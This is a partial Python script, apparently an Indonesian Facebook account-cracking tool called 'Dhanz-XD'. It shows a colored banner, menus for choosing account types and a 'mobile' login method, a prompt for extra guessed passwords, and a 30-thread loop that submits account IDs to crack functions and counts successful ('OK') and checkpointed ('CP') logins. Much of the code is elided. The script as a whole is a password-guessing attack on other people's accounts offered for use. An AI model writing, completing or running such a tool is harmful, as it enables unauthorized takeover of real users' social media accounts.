...
def banner():
	...
	print("""
\x1b[1;97m╔═══╦╗
\x1b[1;97m╚╗╔╗║║      Suport Wifi | 32bit | 64 bit
\x1b[1;91m ║║║║╚═╦══╦═╗╔═══╗ ® YANG ASLI HANYA ADA DI DHANZ🐣
\x1b[1;91m─║║║║╔╗║╔╗║╔╗╬══║║ ® Status : Free Wak Bebas
\x1b[1;97m╔╝╚╝║║║║╔╗║║║║║══╣ ® Nama : Dhanz-XD 💎
\x1b[1;97m╚═══╩╝╚╩╝╚╩╝╚╩═══╝ ®cap ❤️
       
    
\33[1;96m        CRACK FACEBOOK EAS SUPORT ALL 📂                                           
\33[1;96m      Made By   DHANZ-XD   ®asli ada KAKINYA
\x1b[1;91m      ╭==================╮ ╭================╮   ╭=============================╮
\x1b[1;91m      │ \x1b[0;34mRCD : DHANZ-XD       \x1b[1;92mVersion : 4.4        \x1b[0;34mhttps://github.com/Dhanz03
\x1b[1;91m      ╰==================╯ ╰================╯   ╰=============================╯
""")
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}\x1b[0;34m☞ 1. Akun Old (Not Recomend) ')
	print('\x1b[1;92m☞ 2. Akun New (Lumayan) ')
	print('\x1b[1;92m☞ 3. Random (Recomend) ')
	print('')
	hu = input('☞ Pilih : ')
	if hu in ['1','01']:
		...
		exit()
	print('\x1b[1;92m☞1. MobileV6 ')
	#print('\x1b[0;34m☞2. MobileV2 ')
	#print('\x1b[1;92m☞3. Mbasicv1  ')
	print('')
	hc = input('☞ Pilih : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	pwplus=input('\x1b[1;92m☞ Tambahkan Password Manual ( y/t) ')
	if pwplus in ['y','Ya']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Bandung,Jakarta,Karawang[white] '))
		pwku=input('\x1b[0;34m☞ Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	print(f'│{B}==========================================={B}│')
	print(f'│{M}Crcaker Team Indonesia {h}Dhanz-CooL Wa :085881856121')
	print(f'│ {m}•{k}•{h}•{x} BISMILLAHIRRAHMANIRRAHIM {m}•{k}•{h}•{x} ')
	print(f'│{M}==========================================={M}│')
	print('')
	print(f'│{K}==========================================={K}│')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(cracktouch,idf,pwv)
	print('')
	cetak(nel('\t[cyan] ☞[green] Crack Selesay , Hasil Hari Ini 🦈[cyan] ☜ [white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r┗➜ Dhanz {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
